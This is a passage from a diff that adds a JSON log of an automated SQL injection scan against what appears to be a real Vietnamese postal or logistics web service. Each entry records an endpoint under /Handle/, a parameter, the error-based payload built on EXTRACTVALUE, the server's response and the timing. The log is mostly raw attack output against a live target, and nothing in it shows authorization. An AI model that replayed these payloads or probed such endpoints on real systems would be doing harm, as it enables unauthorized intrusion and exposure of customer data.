\"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 4.486313343048096
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "MobileNumber",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 7.537371397018433
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchListDistrictByProvinceID",
+      "param": "DistrictID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[]",
+      "elapsed": 4.236936569213867
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 14.972172975540161
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListDistrictByProvinceID",
+      "param": "GroupPermissionID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[]",
+      "elapsed": 6.256699323654175
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListFunctionalByGroupPermissionID",
+      "param": "customer_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[]",
+      "elapsed": 4.228231191635132
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListFunctionalByGroupPermissionID",
+      "param": "query",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[]",
+      "elapsed": 4.767712831497192
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchListFunctionalByGroupPermissionID",
+      "param": "customer_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[]",
+      "elapsed": 5.256208181381226
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/TransportPostageCharged",
+      "param": "ID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"00\",\"Message\":\"Thành công.\",\"Data\":\"{\\\"MainFee\\\":0,\\\"ExtraFee\\\":0,\\\"Surcharge\\\":0,\\\"TotalAmount\\\":0,\\\"MainFeeNotVAT\\\":0,\\\"ExtraFeeNotVAT\\\":0,\\\"SurchargeNotVAT\\\":0,\\\"TotalAmountNotVAT\\\":0}\",\"Time\":\"06/11/2025 00:29:02\",\"Signature\":null}",
+      "elapsed": 4.250493288040161
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchListFunctionalByGroupPermissionID",
+      "param": "customerID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[]",
+      "elapsed": 5.77213716506958
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/TransportPostageCharged",
+      "param": "search",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"00\",\"Message\":\"Thành công.\",\"Data\":\"{\\\"MainFee\\\":0,\\\"ExtraFee\\\":0,\\\"Surcharge\\\":0,\\\"TotalAmount\\\":0,\\\"MainFeeNotVAT\\\":0,\\\"ExtraFeeNotVAT\\\":0,\\\"SurchargeNotVAT\\\":0,\\\"TotalAmountNotVAT\\\":0}\",\"Time\":\"06/11/2025 00:29:03\",\"Signature\":null}",
+      "elapsed": 4.292787551879883
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListFunctionalByGroupPermissionID",
+      "param": "mobile",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[]",
+      "elapsed": 5.772295236587524
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/TransportPostageCharged",
+      "param": "mobile",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"00\",\"Message\":\"Thành công.\",\"Data\":\"{\\\"MainFee\\\":0,\\\"ExtraFee\\\":0,\\\"Surcharge\\\":0,\\\"TotalAmount\\\":0,\\\"MainFeeNotVAT\\\":0,\\\"ExtraFeeNotVAT\\\":0,\\\"SurchargeNotVAT\\\":0,\\\"TotalAmountNotVAT\\\":0}\",\"Time\":\"06/11/2025 00:29:04\",\"Signature\":null}",
+      "elapsed": 4.778497934341431
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/TransportPostageCharged",
+      "param": "email",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"00\",\"Message\":\"Thành công.\",\"Data\":\"{\\\"MainFee\\\":0,\\\"ExtraFee\\\":0,\\\"Surcharge\\\":0,\\\"TotalAmount\\\":0,\\\"MainFeeNotVAT\\\":0,\\\"ExtraFeeNotVAT\\\":0,\\\"SurchargeNotVAT\\\":0,\\\"TotalAmountNotVAT\\\":0}\",\"Time\":\"06/11/2025 00:29:05\",\"Signature\":null}",
+      "elapsed": 5.765180587768555
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVMapCode",
+      "param": "customerID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:06\",\"Signature\":null}",
+      "elapsed": 4.77185320854187
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "ID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:08\",\"Signature\":null}",
+      "elapsed": 4.366605758666992
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "userId",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:09\",\"Signature\":null}",
+      "elapsed": 4.3451783657073975
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVMapCode",
+      "param": "MobileNumber",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:09\",\"Signature\":null}",
+      "elapsed": 6.808582305908203
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "user_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:10\",\"Signature\":null}",
+      "elapsed": 5.892100811004639
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVMapCode",
+      "param": "Password",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:10\",\"Signature\":null}",
+      "elapsed": 7.302886247634888
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "customerID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:10\",\"Signature\":null}",
+      "elapsed": 5.371846914291382
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/TransportPostageCharged",
+      "param": "Id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"00\",\"Message\":\"Thành công.\",\"Data\":\"{\\\"MainFee\\\":0,\\\"ExtraFee\\\":0,\\\"Surcharge\\\":0,\\\"TotalAmount\\\":0,\\\"MainFeeNotVAT\\\":0,\\\"ExtraFeeNotVAT\\\":0,\\\"SurchargeNotVAT\\\":0,\\\"TotalAmountNotVAT\\\":0}\",\"Time\":\"06/11/2025 00:29:10\",\"Signature\":null}",
+      "elapsed": 12.309843301773071
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:11\",\"Signature\":null}",
+      "elapsed": 7.922470808029175
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "MobileNumber",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:12\",\"Signature\":null}",
+      "elapsed": 4.388574838638306
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "Email",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:13\",\"Signature\":null}",
+      "elapsed": 4.365905046463013
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVMapCode",
+      "param": "Type",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"99\",\"Message\":\"Lỗi hệ thống, vui lòng liên hệ quản trị.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:13\",\"Signature\":null}",
+      "elapsed": 10.345840215682983
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "Password",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:13\",\"Signature\":null}",
+      "elapsed": 4.3698601722717285
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "Type",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:15\",\"Signature\":null}",
+      "elapsed": 5.381874322891235
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "Email",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:15\",\"Signature\":null}",
+      "elapsed": 6.364109992980957
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "Id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:15\",\"Signature\":null}",
+      "elapsed": 11.403156995773315
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:16\",\"Signature\":null}",
+      "elapsed": 4.355543375015259
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "query",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:19\",\"Signature\":null}",
+      "elapsed": 13.431795597076416
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "keyword",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:20\",\"Signature\":null}",
+      "elapsed": 13.937457084655762
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "email",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:20\",\"Signature\":null}",
+      "elapsed": 13.476799011230469
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "Type",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:20\",\"Signature\":null}",
+      "elapsed": 11.403120279312134
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "customer_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:21\",\"Signature\":null}",
+      "elapsed": 6.404507398605347
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "userId",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:21\",\"Signature\":null}",
+      "elapsed": 7.34490966796875
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "phone",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:22\",\"Signature\":null}",
+      "elapsed": 4.870671272277832
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "userID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:22\",\"Signature\":null}",
+      "elapsed": 8.919822216033936
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVNPMapsAutocomplete",
+      "param": "ProvinceID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:23\",\"Signature\":null}",
+      "elapsed": 12.938377857208252
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "Password",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:24\",\"Signature\":null}",
+      "elapsed": 5.882375478744507
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "keyword",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:24\",\"Signature\":null}",
+      "elapsed": 8.42101502418518
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "name",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:25\",\"Signature\":null}",
+      "elapsed": 8.402950286865234
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "DistrictID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:25\",\"Signature\":null}",
+      "elapsed": 5.884424686431885
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "username",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:25\",\"Signature\":null}",
+      "elapsed": 4.3372719287872314
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "MobileNumber",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:26\",\"Signature\":null}",
+      "elapsed": 7.902086019515991
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "customerID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:26\",\"Signature\":null}",
+      "elapsed": 11.421483039855957
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "uid",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:26\",\"Signature\":null}",
+      "elapsed": 4.315370082855225
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "DistrictID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:26\",\"Signature\":null}",
+      "elapsed": 7.39564847946167
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "Id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:27\",\"Signature\":null}",
+      "elapsed": 13.950390815734863
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "Email",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:27\",\"Signature\":null}",
+      "elapsed": 8.893084287643433
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "customer_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":\"01\",\"Message\":\"Lỗi phân tích địa chỉ.\",\"Data\":null,\"Time\":\"06/11/2025 00:29:27\",\"Signature\":null}",
+      "elapsed": 13.471289873123169
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByEMSVMapsSearch",
+      "param": "Type",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:31\",\"Signature\":null}",
+      "elapsed": 4.26257586479187
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByEMSVMapsSearch",
+      "param": "customer_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:33\",\"Signature\":null}",
+      "elapsed": 8.837406635284424
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "user_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:33\",\"Signature\":null}",
+      "elapsed": 4.9098241329193115
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByEMSVMapsSearch",
+      "param": "user",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:34\",\"Signature\":null}",
+      "elapsed": 6.7887022495269775
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "userID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:35\",\"Signature\":null}",
+      "elapsed": 5.440786600112915
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "customer_id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:36\",\"Signature\":null}",
+      "elapsed": 5.93514084815979
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByEMSVMapsSearch",
+      "param": "id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:37\",\"Signature\":null}",
+      "elapsed": 14.350358247756958
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "customerID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:37\",\"Signature\":null}",
+      "elapsed": 6.411197662353516
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "Id",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:37\",\"Signature\":null}",
+      "elapsed": 8.986979246139526
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "customerID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "{\"Code\":null,\"Message\":null,\"Data\":null,\"Time\":\"06/11/2025 00:29:39\",\"Signature\":null}",
+      "elapsed": 8.124098777770996
+    },
+    {
+      "method": "POST",
